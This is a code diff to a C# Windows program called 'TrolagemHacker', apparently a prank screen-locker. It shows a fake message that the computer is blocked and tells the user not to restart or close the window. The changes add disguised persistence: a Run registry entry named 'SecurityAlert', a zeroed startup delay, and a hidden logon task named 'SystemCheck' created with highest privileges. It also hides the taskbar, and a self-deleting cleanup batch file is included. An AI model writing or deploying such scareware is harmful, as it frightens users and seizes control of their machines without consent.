@@ -93,7 +93,7 @@ public class TrolagemHacker : Form
         Label lblTexto = new Label();
         lblTexto.Text = "Ola, irmao. Seu computador foi bloqueado!\n\n" +
                         "AVISO: NAO TENTE REINICIAR OU FECHAR ESTA JANELA.\n" +
-                        "SISTEMA SILENCIOSO ATIVADO.";
+                        "CARREGAMENTO INSTANTANEO ATIVADO.";
         lblTexto.ForeColor = Color.Lime;
         lblTexto.Font = new Font("Courier New", 12, FontStyle.Bold);
         lblTexto.TextAlign = ContentAlignment.MiddleCenter;
@@ -141,13 +141,19 @@ public class TrolagemHacker : Form
             } catch {}
         }
 
+        // --- TÉCNICAS DE INSTANTE ZERO ---
         try {
             string exePath = Application.ExecutablePath;
-            RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
-            rk.SetValue("SecurityAlert", exePath);
-            
-            string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SystemCheck.exe");
-            if (!File.Exists(startupPath)) File.Copy(exePath, startupPath, true);
+            // 1. Desativar Atraso de Inicialização do Windows (Startup Delay)
+            RegistryKey rkDelay = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize");
+            rkDelay.SetValue("StartupDelayInMSec", 0, RegistryValueKind.DWord);
+
+            // 2. Registro (Run)
+            RegistryKey rkRun = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            rkRun.SetValue("SecurityAlert", exePath);
+
+            // 3. Tarefa Agendada Instantânea
+            Process.Start(new ProcessStartInfo("schtasks.exe", "/create /sc onlogon /tn \"SystemCheck\" /tr \"" + exePath + "\" /f /rl highest /delay 0000:00") { WindowStyle = ProcessWindowStyle.Hidden });
         } catch {}
 
         ControlarBarraTarefas(false);
@@ -185,8 +191,8 @@ public class TrolagemHacker : Form
             
             try {
                 Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("SecurityAlert", false);
-                string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SystemCheck.exe");
-                if (File.Exists(startupPath)) File.Delete(startupPath);
+                Registry.CurrentUser.DeleteSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize", false);
+                Process.Start(new ProcessStartInfo("schtasks.exe", "/delete /tn \"SystemCheck\" /f") { WindowStyle = ProcessWindowStyle.Hidden });
 
                 string batPath = Path.Combine(Path.GetTempPath(), "cleanup.bat");
                 File.WriteAllText(batPath, "@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q \"" + Application.ExecutablePath + "\"\ndel /f /q \"%~f0\"\nexit");
